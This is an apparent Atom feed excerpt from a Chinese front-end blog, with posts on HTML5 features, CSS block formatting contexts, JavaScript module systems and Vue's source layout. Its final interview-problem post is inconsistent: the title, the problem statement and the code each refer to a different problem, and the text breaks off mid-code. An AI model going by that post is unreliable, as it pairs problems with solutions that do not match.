    <content type="html"><![CDATA[<h1 id="H5新特性"><a href="#H5新特性" class="headerlink" title="H5新特性"></a>H5新特性</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>html5总的来说比html4多了十个新特性，但其不支持ie8及ie8以下版本的浏览器<br>一、语义标签</p><p>二、增强型表单</p><p>三、视频和音频</p><p>四、Canvas绘图</p><p>五、SVG绘图</p><p>六、地理定位</p><p>七、拖放API</p><p>八、WebWorker</p><p>九、WebStorage</p><p>十、WebSocket</p><h2 id="新特性"><a href="#新特性" class="headerlink" title="新特性"></a>新特性</h2><ul><li>画布(<code>Canvas</code>) API</li><li>地理(<code>Geolocation</code>) API</li><li>音频、视频API(<code>audio</code>,<code>video</code>)</li><li><code>localStorage</code>和<code>sessionStorage</code></li><li><code>webworker</code>, <code>websocket</code></li><li>新的一套标签 <code>header</code>,<code>nav</code>,<code>footer</code>,<code>aside</code>,<code>article</code>,<code>section</code></li><li><code>web worker</code>是运行在浏览器后台的js程序，他不影响主程序的运行，是另开的一个js线程，可以用这个线程执行复杂的数据操作，然后把操作结果通过postMessage传递给主线程，这样在进行复杂且耗时的操作时就不会阻塞主线程了。</li><li><code>HTML5 History</code>两个新增的API：<code>history.pushState</code> 和 <code>history.replaceState</code>，两个 API 都会操作浏览器的历史记录，而不会引起页面的刷新。</li></ul><blockquote><p><code>Hash</code>就是<code>url</code> 中看到 <code>#</code> ,我们需要一个根据监听哈希变化触发的事件( <code>hashchange</code>) 事件。我们用 <code>window.location</code>处理哈希的改变时不会重新渲染页面，而是当作新页面加到历史记录中，这样我们跳转页面就可以在 hashchange 事件中注册 ajax 从而改变页面内容。 可以为hash的改变添加监听事件：</p></blockquote><ul><li><code>WebSocket</code> 使用<code>ws</code>或<code>wss</code>协议，<code>Websocket</code>是一个持久化的协议，相对于HTTP这种非持久的协议来说。WebSocket API最伟大之处在于服务器和客户端可以在给定的时间范围内的任意时刻，相互推送信息。<code>WebSocket</code>并不限于以Ajax(或XHR)方式通信，因为Ajax技术需要客户端发起请求，而WebSocket服务器和客户端可以彼此相互推送信息；XHR受到域的限制，而<code>WebSocket</code>允许跨域通信</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h5 id="新增"><a href="#新增" class="headerlink" title="新增"></a>新增</h5><p>结构元素：article、aside、header、hgroup、footer、figure、section、nav<br>其他元素：video、audio、canvas、embed、mark、progress、meter、time、command、details、datagrid、keygen、output、source、menu、ruby、wbr、bdi、dialog、</p><h5 id="废除"><a href="#废除" class="headerlink" title="废除"></a>废除</h5><p>纯表现元素：basefont、big、center、font、s、strike、tt、u 用css代替<br>部分浏览器支持的元素：applet、bgsound、blink、marquee<br>对可用性产生负面影响的元素：frameset、frame、noframes,在html5中不支持frame框架，只支持iframe框架</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;H5新特性&quot;&gt;&lt;a href=&quot;#H5新特性&quot; class=&quot;headerlink&quot; title=&quot;H5新特性&quot;&gt;&lt;/a&gt;H5新特性&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前</summary>
      
    
    
    
    <category term="html" scheme="https://zhouhang-hello.gitee.io/hexo_blog/categories/html/"/>
    
    
    <category term="html" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/html/"/>
    
  </entry>
  
  <entry>
    <title>BFC🚓</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/09/14/BFC/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/09/14/BFC/</id>
    <published>2021-09-14T02:00:00.000Z</published>
    <updated>2021-10-11T17:13:43.700Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h1><p><code>常见的定位方案，定位方案是控制元素的布局，有三种常见方案:</code></p><ul><li>普通流 (normal flow)</li></ul><blockquote><p>在普通流中，元素按照其在 HTML 中的先后位置至上而下布局，在这个过程中，行内元素水平排列，直到当行被占满然后换行，块级元素则会被渲染为完整的一个新行，除非另外指定，否则所有元素默认都是普通流定位，也可以说，普通流中元素的位置由该元素在 HTML 文档中的位置决定。</p></blockquote><ul><li>浮动 (float)</li></ul><blockquote><p>在浮动布局中，元素首先按照普通流的位置出现，然后根据浮动的方向尽可能的向左边或右边偏移，其效果与印刷排版中的文本环绕相似。</p></blockquote><ul><li>绝对定位 (absolute positioning)</li></ul><blockquote><p>在绝对定位布局中，元素会整体脱离普通流，因此绝对定位元素不会对其兄弟元素造成影响，而元素具体的位置由绝对定位的坐标决定。</p></blockquote><p><strong>Formatting context(格式化上下文) 是 W3C CSS2.1 规范中的一个概念。它是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用。</strong></p><p>那么 BFC 是什么呢？</p><p>BFC 即 Block Formatting Contexts (块级格式化上下文)，它属于上述定位方案的普通流。</p><p>具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。</p><p>通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。</p><h4 id="触发-BFC"><a href="#触发-BFC" class="headerlink" title="触发 BFC"></a>触发 BFC</h4><p>只要元素满足下面任一条件即可触发 BFC 特性：</p><ul><li>body 根元素</li><li>浮动元素：float 除 none 以外的值</li><li>绝对定位元素：position (absolute、fixed)</li><li>display 为 inline-block、table-cells、flex</li><li>overflow 除了 visible 以外的值 (hidden、auto、scroll)</li></ul><h4 id="BFC-特性及应用"><a href="#BFC-特性及应用" class="headerlink" title="BFC 特性及应用"></a>BFC 特性及应用</h4><p><strong>1. 同一个 BFC 下外边距会发生折叠</strong></p><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>div&#123;    width: 100px;    height: 100px;    background: lightblue;    margin: 100px;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></code></pre></div><p><img src="https://pic4.zhimg.com/80/v2-0a9ca8952c83141250a2d9002e6d2047_720w.png" alt="img"></p><p>从效果上看，因为两个 div 元素都处于同一个 BFC 容器下 (这里指 body 元素) 所以第一个 div 的下边距和第二个 div 的上边距发生了重叠，所以两个盒子之间距离只有 100px，而不是 200px。</p><p>首先这不是 CSS 的 bug，我们可以理解为一种规范，<strong>如果想要避免外边距的重叠，可以将其放在不同的 BFC 容器中。</strong></p><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>.container &#123;    overflow: hidden;&#125;p &#123;    width: 100px;    height: 100px;    background: lightblue;    margin: 100px;&#125;</code></pre></div><p>这时候，两个盒子边距就变成了 200px</p><p><img src="https://pic2.zhimg.com/80/v2-5b8d6e8b2b507352900c1ece00018855_720w.png" alt="img"></p><p><strong>2. BFC 可以包含浮动的元素（清除浮动）</strong></p><p>我们都知道，浮动的元素会脱离普通文档流，来看下下面一个例子</p><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border: 1px solid #000;&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100px;height: 100px;background: #eee;float: left;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre></div><p><img src="https://pic4.zhimg.com/80/v2-371eb702274af831df909b2c55d6a14b_720w.png" alt="img"></p><p>由于容器内元素浮动，脱离了文档流，所以容器只剩下 2px 的边距高度。如果使触发容器的 BFC，那么容器将会包裹着浮动元素。</p><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border: 1px solid #000;overflow: hidden&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100px;height: 100px;background: #eee;float: left;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre></div><p>效果如图：</p><p><img src="https://pic4.zhimg.com/80/v2-cc8365db5c9cc5ca003ce9afe88592e7_720w.png" alt="img"></p><p><strong>3. BFC 可以阻止元素被浮动元素覆盖</strong></p><p>先来看一个文字环绕效果：</p><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;height: 100px;width: 100px;float: left;background: lightblue&quot;</span>&gt;</span>我是一个左浮动的元素<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 200px; height: 200px;background: #eee&quot;</span>&gt;</span>我是一个没有设置浮动, 也没有触发 BFC 元素, width: 200px; height:200px; background: #eee;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre></div><p><img src="https://pic4.zhimg.com/80/v2-dd3e636d73682140bf4a781bcd6f576b_720w.png" alt="img"></p><p>这时候其实第二个元素有部分被浮动元素所覆盖，(但是文本信息不会被浮动元素所覆盖) 如果想避免元素被覆盖，可触第二个元素的 BFC 特性，在第二个元素中加入 <strong>overflow: hidden</strong>，就会变成：</p><p><img src="https://pic3.zhimg.com/80/v2-5ebd48f09fac875f0bd25823c76ba7fa_720w.png" alt="img"></p><p>这个方法可以用来实现两列自适应布局，效果不错，这时候左边的宽度固定，右边的内容自适应宽度(去掉上面右边内容的宽度)。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BFC&quot;&gt;&lt;a href=&quot;#BFC&quot; class=&quot;headerlink&quot; title=&quot;BFC&quot;&gt;&lt;/a&gt;BFC&lt;/h1&gt;&lt;p&gt;&lt;code&gt;常见的定位方案，定位方案是控制元素的布局，有三种常见方案:&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;普通流 (norma</summary>
      
    
    
    
    <category term="css" scheme="https://zhouhang-hello.gitee.io/hexo_blog/categories/css/"/>
    
    
    <category term="css" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>模块化✊</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/09/12/%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/09/12/%E6%A8%A1%E5%9D%97%E5%8C%96/</id>
    <published>2021-09-12T02:00:00.000Z</published>
    <updated>2021-10-11T17:12:33.447Z</updated>
    
    <content type="html"><![CDATA[<h1 id="模块化🔓"><a href="#模块化🔓" class="headerlink" title="模块化🔓"></a>模块化🔓</h1><p><img src="../../../../hexo/themes/fluid/source/img/tag13.webp"></p><h2 id="ES6-模块与-CommonJS-模块的差异"><a href="#ES6-模块与-CommonJS-模块的差异" class="headerlink" title="ES6 模块与 CommonJS 模块的差异"></a>ES6 模块与 CommonJS 模块的差异</h2><blockquote><p>在有 <code>Babel</code> 的情况下，我们可以直接使用 <code>ES6</code>的模块化</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">// file a.js</span><span class="hljs-keyword">export</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>) </span>&#123;&#125;<span class="hljs-keyword">export</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>) </span>&#123;&#125;<span class="hljs-comment">// file b.js</span><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;&#125;<span class="hljs-keyword">import</span> &#123;a, b&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./a.js&#x27;</span><span class="hljs-keyword">import</span> XXX <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./b.js&#x27;</span></code></pre></div><p><strong>CommonJS</strong></p><blockquote><p><code>CommonJs</code> 是 <code>Node</code> 独有的规范，浏览器中使用就需要用到 <code>Browserify</code>解析了。</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">// a.js</span><span class="hljs-built_in">module</span>.exports = &#123;    a: <span class="hljs-number">1</span>&#125;<span class="hljs-comment">// or</span><span class="hljs-built_in">exports</span>.a = <span class="hljs-number">1</span><span class="hljs-comment">// b.js</span><span class="hljs-keyword">var</span> <span class="hljs-built_in">module</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./a.js&#x27;</span>)<span class="hljs-built_in">module</span>.a <span class="hljs-comment">// -&gt; log 1</span></code></pre></div><blockquote><p>在上述代码中，<code>module.exports</code> 和 <code>exports</code> 很容易混淆，让我们来看看大致内部实现</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">var</span> <span class="hljs-built_in">module</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./a.js&#x27;</span>)<span class="hljs-built_in">module</span>.a<span class="hljs-comment">// 这里其实就是包装了一层立即执行函数，这样就不会污染全局变量了，</span><span class="hljs-comment">// 重要的是 module 这里，module 是 Node 独有的一个变量</span><span class="hljs-built_in">module</span>.exports = &#123;    a: <span class="hljs-number">1</span>&#125;<span class="hljs-comment">// 基本实现</span><span class="hljs-keyword">var</span> <span class="hljs-built_in">module</span> = &#123;  <span class="hljs-built_in">exports</span>: &#123;&#125; <span class="hljs-comment">// exports 就是个空对象</span>&#125;<span class="hljs-comment">// 这个是为什么 exports 和 module.exports 用法相似的原因</span><span class="hljs-keyword">var</span> <span class="hljs-built_in">exports</span> = <span class="hljs-built_in">module</span>.exports<span class="hljs-keyword">var</span> load = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-built_in">module</span></span>) </span>&#123;    <span class="hljs-comment">// 导出的东西</span>    <span class="hljs-keyword">var</span> a = <span class="hljs-number">1</span>    <span class="hljs-built_in">module</span>.exports = a    <span class="hljs-keyword">return</span> <span class="hljs-built_in">module</span>.exports&#125;;</code></pre></div><blockquote><p>再来说说 <code>module.exports</code> 和<code>exports</code>，用法其实是相似的，但是不能对 <code>exports</code> 直接赋值，不会有任何效果。</p></blockquote><blockquote><p>对于 <code>CommonJS</code> 和 <code>ES6</code> 中的模块化的两者区别是：</p></blockquote><ul><li>前者支持动态导入，也就是 <code>require($&#123;path&#125;/xx.js)</code>，后者目前不支持，但是已有提案,前者是同步导入，因为用于服务端，文件都在本地，同步导入即使卡住主线程影响也不大。</li><li>而后者是异步导入，因为用于浏览器，需要下载文件，如果也采用同步导入会对渲染有很大影响</li><li>前者在导出时都是值拷贝，就算导出的值变了，导入的值也不会改变，所以如果想更新值，必须重新导入一次。</li><li>但是后者采用实时绑定的方式，导入导出的值都指向同一个内存地址，所以导入值会跟随导出值变化</li><li>后者会编译成 <code>require/exports</code> 来执行的</li></ul><p><strong>AMD</strong></p><blockquote><p><code>AMD</code> 是由 <code>RequireJS</code> 提出的</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">// AMD</span>define([<span class="hljs-string">&#x27;./a&#x27;</span>, <span class="hljs-string">&#x27;./b&#x27;</span>], <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">a, b</span>) </span>&#123;    a.do()    b.do()&#125;)define(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-built_in">require</span>, <span class="hljs-built_in">exports</span>, <span class="hljs-built_in">module</span></span>) </span>&#123;       <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./a&#x27;</span>)      a.doSomething()       <span class="hljs-keyword">var</span> b = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./b&#x27;</span>)    b.doSomething()&#125;)</code></pre></div><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h5 id="1-CommonJS-模块输出的是一个值的拷贝，ES6-模块输出的是值的引用。"><a href="#1-CommonJS-模块输出的是一个值的拷贝，ES6-模块输出的是值的引用。" class="headerlink" title="1. CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。"></a>1. CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。</h5><ul><li>CommonJS 模块输出的是值的拷贝，也就是说，一旦输出一个值，模块内部的变化就影响不到这个值。</li><li>ES6 模块的运行机制与 CommonJS 不一样。JS 引擎对脚本静态分析的时候，遇到模块加载命令<code>import</code>，就会生成一个只读引用。等到脚本真正执行时，再根据这个只读引用，到被加载的那个模块里面去取值。换句话说，ES6 的<code>import</code>有点像 Unix 系统的“符号连接”，原始值变了，<code>import</code>加载的值也会跟着变。因此，ES6 模块是动态引用，并且不会缓存值，模块里面的变量绑定其所在的模块。</li></ul><h5 id="2-CommonJS-模块是运行时加载，ES6-模块是编译时输出接口。"><a href="#2-CommonJS-模块是运行时加载，ES6-模块是编译时输出接口。" class="headerlink" title="2. CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。"></a>2. CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。</h5><ul><li>运行时加载: CommonJS 模块就是对象；即在输入时是先加载整个模块，生成一个对象，然后再从这个对象上面读取方法，这种加载称为“运行时加载”。</li><li>编译时加载: ES6 模块不是对象，而是通过 <code>export</code> 命令显式指定输出的代码，<code>import</code>时采用静态命令的形式。即在<code>import</code>时可以指定加载某个输出值，而不是加载整个模块，这种加载称为“编译时加载”。</li></ul><p>CommonJS 加载的是一个对象（即<code>module.exports</code>属性），该对象只有在脚本运行完才会生成。而 ES6 模块不是对象，它的对外接口只是一种静态定义，在代码静态解析阶段就会生成。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;模块化🔓&quot;&gt;&lt;a href=&quot;#模块化🔓&quot; class=&quot;headerlink&quot; title=&quot;模块化🔓&quot;&gt;&lt;/a&gt;模块化🔓&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;../../../../hexo/themes/fluid/source/img/tag13.w</summary>
      
    
    
    
    <category term="js" scheme="https://zhouhang-hello.gitee.io/hexo_blog/categories/js/"/>
    
    
    <category term="js" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>vue源码解读🍺</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/09/10/vue%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/09/10/vue%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/</id>
    <published>2021-09-10T02:00:00.000Z</published>
    <updated>2021-11-11T10:15:19.273Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vue源码解读"><a href="#vue源码解读" class="headerlink" title="vue源码解读"></a>vue源码解读</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在深入学习vue，打算对源码做一些了解</p><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><div class="hljs code-wrapper"><pre><code class="hljs routeros">├── benchmarks                  性能、基准测试├── dist                        构建打包的输出目录├── examples                    案例目录├── flow                        flow 语法的类型声明├── packages                    一些额外的包，比如：负责服务端渲染的包 vue-server-renderer、配合 vue-loader 使用的的 vue-template-compiler，还有 weex 相关的│   ├── vue-server-renderer│   ├── vue-template-compiler│   ├── weex-template-compiler│   └── weex-vue-framework├── scripts                     所有的配置文件的存放位置，比如 rollup 的配置文件├── src                         vue 源码目录│   ├── compiler                编译器│   ├── core                    运行时的核心包│   │   ├── components          全局组件，比如 keep-alive│   │   ├── config.js           一些默认配置项│   │   ├── global-api          全局 API，比如熟悉的：Vue.use()、Vue.component() 等│   │   ├──<span class="hljs-built_in"> instance </span>           Vue 实例相关的，比如 Vue 构造函数就在这个目录下│   │   ├── observer            响应式原理│   │   ├── util                工具方法│   │   └── vdom                虚拟 DOM 相关，比如熟悉的 patch 算法就在这儿│   ├── platforms               平台相关的编译器代码│   │   ├── web│   │   └── weex│   ├──<span class="hljs-built_in"> server </span>                 服务端渲染相关├── test                        测试目录├── types                       TS 类型声明</code></pre></div><h3 id="源码学习方法"><a href="#源码学习方法" class="headerlink" title="源码学习方法"></a>源码学习方法</h3><h3 id="flow-类型检测"><a href="#flow-类型检测" class="headerlink" title="flow 类型检测"></a>flow 类型检测</h3><blockquote><p>​    Flow就是JavaScript的静态类型检查工具，作为脚本语言，他的灵活性</p><p>Flow支持原始数据类型，其中void对应js中的undefined</p><p>基本内型  boolean / number/  string  /null  /void</p><p>引用内型   Object / Array  /Function  /自定义Class</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vue源码解读&quot;&gt;&lt;a href=&quot;#vue源码解读&quot; class=&quot;headerlink&quot; title=&quot;vue源码解读&quot;&gt;&lt;/a&gt;vue源码解读&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前</summary>
      
    
    
    
    <category term="vue" scheme="https://zhouhang-hello.gitee.io/hexo_blog/categories/vue/"/>
    
    
    <category term="vue" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>替换空格 🤺</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/09/10/%E5%89%91%E6%8C%87offer-2/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/09/10/%E5%89%91%E6%8C%87offer-2/</id>
    <published>2021-09-10T02:00:00.000Z</published>
    <updated>2021-10-11T17:00:33.023Z</updated>
    
    <content type="html"><![CDATA[<h4 id="题目：-2-替换空格"><a href="#题目：-2-替换空格" class="headerlink" title="题目：(2)替换空格"></a>题目：(2)替换空格</h4><p>在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</p><p><strong>例子:</strong></p><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Input:</span> <span class="hljs-string">(2</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">4</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">3</span><span class="hljs-string">)</span> <span class="hljs-string">+</span> <span class="hljs-string">(5</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">6</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">4</span><span class="hljs-string">)</span><span class="hljs-attr">Output:</span> <span class="hljs-number">7</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">0</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">8</span><span class="hljs-attr">Explanation:</span> <span class="hljs-number">342</span> <span class="hljs-string">+</span> <span class="hljs-number">465</span> <span class="hljs-string">=</span> <span class="hljs-number">807</span><span class="hljs-string">.</span></code></pre></div><p><strong>解决:</strong> </p><h6 id="▉-算法思路："><a href="#▉-算法思路：" class="headerlink" title="▉ 算法思路："></a>▉ 算法思路：</h6><blockquote><p>1）观察先知道空格的位置。</p><p>2）多位数加多位数，反转链表转化整数，如果整数相加，可能会溢出，此方法行不通。</p><p>3）直接进行位数运算，两链表每取出一个就做运算，将结果放入到新链表中。</p></blockquote><h6 id="▉-步骤："><a href="#▉-步骤：" class="headerlink" title="▉ 步骤："></a>▉ 步骤：</h6><blockquote><p>1）遍历链表之前，要定义一个哨兵结点、临时结点、存储计算结果的结点、进位标志；</p><p>2）开始遍历数据，判断当前结点是否为 null，为 null 就用 0 代替，否则取出数值；</p><p>3）求和（加 carray 进位），判断是否进位？记录进位值；</p><p>4）求模取余，计算两位数的各位数存储到链表中，指针向后移动；</p><p>5）判断结点是否为 null，继续遍历（如果链表 l2 比 l1 短,没有下一结点只能返回本身下次处理当做 null 处理）</p><ol start="6"><li>退出 while 循环勿忘最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位，存放到链表最后</li></ol></blockquote><h6 id="▉-代码实现："><a href="#▉-代码实现：" class="headerlink" title="▉ 代码实现："></a>▉ 代码实现：</h6><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * 性能分析：</span><span class="hljs-comment"> * 1)遍历整个链表，时间复杂度为 O（n）。</span><span class="hljs-comment"> * 2)需要额外的 n 大小的空间存储 计算结果结点，空间复杂度为 O(n)。</span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> addTwoNumbers = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">l1, l2</span>) </span>&#123;    <span class="hljs-comment">//定义哨兵结点</span>    <span class="hljs-keyword">let</span> head = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-string">&quot;head&quot;</span>);    <span class="hljs-keyword">let</span> current = head;<span class="hljs-comment">//临时指针</span>    <span class="hljs-comment">//存储计算后的链表</span>    <span class="hljs-keyword">let</span> sumNode = head;    <span class="hljs-comment">//定义进位变量</span>    <span class="hljs-keyword">let</span> carray = <span class="hljs-number">0</span>;    <span class="hljs-comment">//开始遍历两个链表取数据，判断链表是否为 null</span>    <span class="hljs-function"><span class="hljs-title">while</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span> || l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;        <span class="hljs-comment">//判断取数据的链表是否为nulL,为 null 就用 0 替换</span>        <span class="hljs-keyword">let</span> num1 = <span class="hljs-number">0</span>;        <span class="hljs-keyword">let</span> num2 = <span class="hljs-number">0</span>;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l1 == <span class="hljs-literal">null</span></span>)</span>&#123;            num1 = <span class="hljs-number">0</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            num1 = l1.val;        &#125;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l2 == <span class="hljs-literal">null</span></span>)</span>&#123;            num2 = <span class="hljs-number">0</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            num2 = l2.val;        &#125;        <span class="hljs-comment">// let num1 = l1 == null ? 0 : l1.val;</span>        <span class="hljs-comment">// let num2 = l2 == null ? 0 : l2.val;</span>        <span class="hljs-comment">//计算取出的两个数值的和用于判断是否满进位，如果满 10,carray 需要记录进位,默认为 0</span>        <span class="hljs-keyword">let</span> sum = num1 + num2 + carray;        <span class="hljs-comment">//判断是否需要存储进位值 1</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">sum &gt; <span class="hljs-number">9</span></span>)</span>&#123;           carray = <span class="hljs-number">1</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            carray = <span class="hljs-number">0</span>;        &#125;        <span class="hljs-comment">//carray = sum &gt; 9 ? 1 : 0;</span>        <span class="hljs-comment">//将两数之和相加[取模(取余运算)]添加到 sumNode 新链表中,一次排列</span>        current.next = <span class="hljs-keyword">new</span> ListNode(sum % <span class="hljs-number">10</span>)        <span class="hljs-comment">//将指针指向下一链表结点</span>        current = current.next;        <span class="hljs-comment">//继续遍历链表中的数据，判断下一结点是否为 null</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span></span>)</span>&#123;            l1 = l1.next;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-comment">//如果链表 l1 比 l2 短,没有下一结点只能返回本身下次处理当做 null 处理</span>            l1 = l1;        &#125;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;            l2 = l2.next;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-comment">//如果链表 l2 比 l1 短,没有下一结点只能返回本身下次处理当做 null 处理</span>            l2 = l2;        &#125;        <span class="hljs-comment">// l1 为不为 null 才满足条件</span>        <span class="hljs-comment">// l1 = l1 ? l1.next : l1;</span>        <span class="hljs-comment">// l2 = l2 ? l2.next : l2;</span>    &#125;    <span class="hljs-comment">//最高位满位情况,carray 